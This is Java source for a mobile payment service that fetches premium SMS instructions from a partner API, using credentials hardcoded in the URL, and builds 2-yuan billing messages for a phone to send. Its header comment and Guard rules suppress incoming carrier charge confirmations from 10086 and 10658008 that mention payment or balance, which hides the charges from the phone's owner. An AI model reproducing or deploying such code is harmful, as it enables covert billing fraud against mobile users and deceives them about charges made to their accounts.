package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 指令0204

资费：2元
日月限：日2月3
动态2次
开通省份：全开，屏蔽河南、山西、广东、江苏、河北、天津、江西、浙江、宁夏、重庆、甘肃、宁夏、湖北、广西、上海和各省会地市


第一步：请求我司的接口地址
http://www.17lyou.com/sjqb?username=jin-mei&passwd=jin-mei&cmd=020a1051

其中：
cmd上行指令  ，指令可模糊（总长20位以内）

返回：
0：成功
1：用户名密码错误
2：用户名空
3：密码空
5：指令空
7：入库失败

第二步：请求成功后，响应内容如下：
     {"isDirectPay":"1","mo1Called":"1065800810155979","mo2Called":"10658008295979517172","mo1Msg":"020#14078787818#20140610#95979517172","amount":"200","mo2Msg":"8"}
参数	说明
isDirectPay	需发送短信的条数
Mo1Called	短信1上行端口
Mo2Called	短信1上行内容
Mo1Msg	短信2上行端口
Mo2Msg	短信2上行内容
amount	资费（分）

	第一步：发送mo1Called到mo1Msg
	mo1Called:上行端口
	mo1Msg:上行内容
	第二步：发送mo2Called到mo2Msg
	mo2Called: 上行端口
	mo2Msg:上行内容
	
isDirectPay=1，只需完成第1步操作（发送1条信息）；isDirectPay=0则在完成第一步后，继续第2步的操作（发送2条信息）


第三步，按操作回复短信，扣费成功

屏蔽下发语：
10086
中国移动通信账户支付2元成功！您购买的商品是炫舞宝贝20金币，若未成功获取商品服务信息，请与我们联系。客服81732787

10658008295302455902
通信账户支付2元。感谢购买炫舞宝贝金币，祝您游戏愉快，客服81732787
 * @author leoliu
 *
 */
public class ZztldDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(ZztldDynamicService.class);
	private static final String TYPE = "zztld";
	
	private static final String URLPARAM = "username=jin-mei&passwd=jin-mei&cmd=020a1051";
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658008", "无法|有误|请核对", 2880, "-1", 0);
	private static final Guard guard2 = new Guard("10658008","处理|等候",2880,"0",0);
	private static final Guard guard6 = new Guard("10658008","通信账户支付|感谢购买|客服",2880,"1",0);
	private static final Guard guard3 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard4 = new Guard("10658008","",960,null,1);
	private static final Guard guard5 = new Guard("10086","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private boolean test = false;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		if(!test){
//			return DynamicUtils.parseError("598");
		}
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
//			String imsi = StringUtils.defaultString(map.get("imsi"));
//			
//			if(imsi.length() == 0){
//				imsi = "46000115310";
//			}
//			
//			imsi = fillImei(imsi);
//			
			String param = URLPARAM;
//			param = param.replace("{imsi}", imsi);
//			
//			String imei = StringUtils.defaultString(map.get("imei"));
//			
//			imei = imei.replaceAll("[a-zA-Z]","1");
//			
//			imei = fillImei(imei);
//			
//			param = param.replace("{imei}", imei);
//			
//			String iccid = StringUtils.defaultString(map.get("iccid"));
//			
//			if(iccid.length() <= 1){
//				iccid = "898600";
//			}
//			
//			param = param.replace("{iccid}", iccid);
//			
//			param = param.replace("{amount}", StringUtils.defaultString(map.get("amount")));
//			param = param.replace("{cid}", StringUtils.defaultString(map.get("cid")));
			
			String responseXml = GetData.getData(url+"?"+param);
			
			if(responseXml != null && responseXml.length() > 0){
				xml = parseXml(map,responseXml);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String json){
		
		try {
			JSONObject jo = new JSONObject(json);
		
			if(jo.has("isDirectPay")){
				tryMap.remove(map.get("mobileId"));
				
				String isDirectPay = jo.getString("isDirectPay");
			
				String mo1Called = jo.getString("mo1Called");
				
				String mo2Called = jo.getString("mo2Called");
				
				String mo1Msg = jo.getString("mo1Msg");
				
				String mo2Msg = jo.getString("mo2Msg");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(mo1Msg);
				sms.setSmsDest(mo1Called);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				if("0".equals(isDirectPay)){
					Sms sms1 = new Sms();
					
					sms1.setSmsContent(mo2Msg);
					sms1.setSmsDest(mo2Called);
					sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms1);
				}
				
				Sms guardSms = new Sms();
							
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
						
				guardList.add(guard6);
				guardList.add(guard3);
				guardList.add(guard4);
				guardList.add(guard5);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		
		tryMap.remove(map.get("mobileId"));
		return DynamicUtils.parseError("597");
	}

	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}
}
